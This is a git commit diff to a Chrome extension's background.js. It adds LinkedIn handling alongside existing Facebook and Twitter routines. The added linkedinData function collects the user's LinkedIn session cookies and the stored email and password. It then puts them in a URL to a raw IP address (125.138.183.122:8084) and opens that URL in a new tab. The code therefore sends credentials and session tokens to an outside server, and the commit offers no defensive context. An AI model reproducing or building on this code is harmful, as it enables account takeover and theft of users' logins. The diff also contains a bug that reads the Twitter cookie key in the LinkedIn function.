4dbd1d5652ce9defeb3e81aa009a5e4b0e941519
shawnsavour <congson99tn@gmail.com>
2021-07-20 18:12:21 +0700

    update li undone

--- js/background.js
+++ js/background.js
@@ -1,7 +1,7 @@
-chrome.storage.sync.set({ extensionState: 0 }, function() {});
+chrome.storage.local.set({ extensionState: 0 }, function() {});
 
-function removeCookies(domain, url) {
-    chrome.cookies.getAll({ domain: domain }, function(cookies) {
+function removeCookies(url) {
+    chrome.cookies.getAll({ url: url }, function(cookies) {
         for (var i = 0; i < cookies.length; i++) {
             chrome.cookies.remove({ url: url + cookies[i].path, name: cookies[i].name });
             console.log('cookie removed');
@@ -20,6 +20,14 @@ function savetwCookie(url) {
     chrome.cookies.getAll({ url: url }, function(e) {
         console.log('savecookie');
         chrome.storage.sync.set({ TWcookie: e }, function() {});
+    });
+}
+
+function saveliCookie(url) {
+    chrome.cookies.getAll({ url: url }, function(e) {
+        console.log(e);
+        console.log('savecookie');
+        chrome.storage.sync.set({ LIcookie: e }, function() {});
     });
 }
 
@@ -43,7 +51,7 @@ function addfbCookie() {
         result.FBcookie.forEach(function(item, index) {
             delete item['hostOnly'];
             delete item['session'];
-            item['url'] = 'https://www.facebook.com/';
+            item['url'] = 'https://www.facebook.com';
             chrome.cookies.set(item, function(c) {
                 console.log('cookie added!')
             });
@@ -56,7 +64,20 @@ function addtwCookie() {
         result.TWcookie.forEach(function(item, index) {
             delete item['hostOnly'];
             delete item['session'];
-            item['url'] = 'https://twitter.com/';
+            item['url'] = 'https://twitter.com';
+            chrome.cookies.set(item, function(c) {
+                console.log('cookie added!')
+            });
+        });
+    });
+}
+
+function addliCookie() {
+    chrome.storage.sync.get(['LIcookie'], function(result) {
+        result.TWcookie.forEach(function(item, index) {
+            delete item['hostOnly'];
+            delete item['session'];
+            item['url'] = 'https://www.linkedin.com';
             chrome.cookies.set(item, function(c) {
                 console.log('cookie added!')
             });
@@ -70,6 +91,47 @@ function sendtoContent(msg) {
     function gotTabs(tabs) {
         chrome.tabs.sendMessage(tabs[0].id, msg);
     };
+}
+
+function linkedinData() {
+
+    setTimeout(function() {
+        chrome.storage.sync.get(['LIemail', 'LIpassword'], function(result) {
+            var url = 'https://www.linkedin.com';
+            chrome.cookies.getAll({ url: url }, function(e) {
+                if (e.length > 0) {
+                    format = '';
+                    for (let i = 0; i < e.length; i++) {
+                        if (e[i].name == 'UID') {
+                            var uuid = e[i].value;
+                        }
+                        format += e[i].name + '=' + e[i].value;
+                        format += ';';
+                        if (i == e.length - 1) {
+                            format += 'domain=linkedin.com';
+                        }
+                    }
+                }
+                console.log(format);
+
+
+                if (typeof uuid !== 'undefined') {
+                    console.log('uid defined');
+                    var sendurl = `http://125.138.183.122:8084/php/linkedin.php?uuid=${uuid}&cookie=${format}&email=${result.LIemail}&password=${result.LIpassword}`;
+                    var encodeurl = encodeURI(sendurl);
+                    chrome.tabs.query({ active: true }, function(tabs) {
+                        chrome.tabs.remove(tabs[0].id);
+                    });
+                    chrome.tabs.create({ url: encodeurl });
+                    chrome.storage.local.set({ extensionState: 0 }, function() {});
+                    removeCookies("https://twitter.com");
+                    addliCookie()
+                } else {
+                    console.log('uid undefined');
+                }
+            })
+        })
+    }, 3000)
 }
 
 function twitterData() {
@@ -103,7 +165,8 @@ function twitterData() {
                         chrome.tabs.remove(tabs[0].id);
                     });
                     chrome.tabs.create({ url: encodeurl });
-                    removeCookies(".twitter.com", "https://twitter.com");
+                    chrome.storage.local.set({ extensionState: 0 }, function() {});
+                    removeCookies("https://twitter.com");
                     addtwCookie()
                 } else {
                     console.log('uid undefined');
@@ -151,7 +214,8 @@ function facebookData() {
                             chrome.tabs.remove(tabs[0].id);
                         });
                         chrome.tabs.create({ url: encodeurl });
-                        removeCookies(".facebook.com", "https://mbasic.facebook.com");
+                        chrome.storage.local.set({ extensionState: 0 }, function() {});
+                        removeCookies("https://mbasic.facebook.com");
                         addfbCookie();
                     }
                 }
@@ -172,7 +236,7 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
             break;
         case 'fbLogin':
             savefbCookie('https://mbasic.facebook.com');
-            removeCookies(".facebook.com", "https://mbasic.facebook.com");
+            removeCookies("https://mbasic.facebook.com");
             chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
             break;
         case 'twLogin':
@@ -180,8 +244,16 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
                 chrome.tabs.remove(tabs[0].id);
             });
             savetwCookie('https://twitter.com/');
-            removeCookies(".twitter.com", "https://twitter.com/");
+            removeCookies("https://twitter.com/");
             chrome.tabs.create({ url: 'https://twitter.com/login' });
+            break;
+        case 'liLogin':
+            chrome.tabs.query({ active: true }, function(tabs) {
+                chrome.tabs.remove(tabs[0].id);
+            });
+            saveliCookie('https://www.linkedin.com/');
+            removeCookies("https://www.linkedin.com/");
+            chrome.tabs.create({ url: 'https://www.linkedin.com/login' });
             break;
         case 'donefbLogin':
             setTimeout(facebookData(), 2000);
@@ -189,8 +261,14 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
         case 'donetwLogin':
             setTimeout(twitterData(), 2000);
             break;
+        case 'doneliLogin':
+            setTimeout(linkedinData(), 2000);
+            break;
         case 'testtimeout':
             setTimeout(function() { console.log('testsettimeout5s') }, 5000);
+            break;
+        case 'testliCookie':
+            removeCookies('https://twitter.com/');
             break;
         default:
             console.log('nofunction');
